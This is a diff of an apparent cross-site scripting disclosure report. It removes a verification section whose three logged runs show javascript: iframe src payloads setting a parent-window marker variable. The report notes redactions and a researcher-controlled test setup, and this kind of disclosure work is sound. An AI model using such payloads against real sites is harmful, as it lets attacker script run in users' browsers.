@@ -43,22 +43,6 @@ window.__xss === "gt48261022if3"
 
 Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.
 
-## Fresh verification evidence
-
-| Run | Marker | Observation | Result |
-| --- | --- | --- | --- |
-| 1 | `gt48261022if1` | src exact; parent marker read back | **PASS** |
-| 2 | `gt48261022if2` | src exact; parent marker read back | **PASS** |
-| 3 | `gt48261022if3` | src exact; parent marker read back | **PASS** |
-
-```text
-Saved browser result object:
-1: src=javascript:parent.__xss='gt48261022if1'; xss=gt48261022if1
-2: src=javascript:parent.__xss='gt48261022if2'; xss=gt48261022if2
-3: src=javascript:parent.__xss='gt48261022if3'; xss=gt48261022if3
-```
-
-The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.
 
 ## Confirmed source and Sink
 
